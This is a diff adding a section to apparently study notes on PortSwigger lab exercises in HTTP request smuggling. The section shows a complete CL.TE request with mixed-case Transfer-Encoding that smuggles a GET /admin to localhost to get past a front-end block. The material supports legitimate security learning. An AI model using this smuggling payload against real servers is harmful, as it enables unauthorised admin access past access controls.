@@ -859,6 +859,34 @@ x=1
   
 [PortSwigger Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl)  
 
+### CL.TE multiCase - Admin blocked  
+
+>When attempting to access admin portal URL path, we get the filter message, ```Path /admin is blocked```. The HTTP Request Smuggler scanner ***identify*** the vulnerability as ```CL.TE multiCase (delayed response)```.  
+
+>To access the admin panel, send below request twice, adding the second header ```Content-Length: 10``` prevent the HOST header conflicting with first request.  
+
+```html
+POST / HTTP/1.1
+Host: 0a9b003b0354be5ac067313000d000a0.web-security-academy.net
+Cookie: session=waIS6yM79uaaNUO4MnmxejP2i6sZWo2E
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 116
+tRANSFER-ENCODING: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+```  
+
+![cl.te multicase admin blocked](images/cl.te-multicase-admin-blocked.png)  
+
+[PortSwigger Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te)  
 
 ### CL.TE multiCase - Content-Length
 
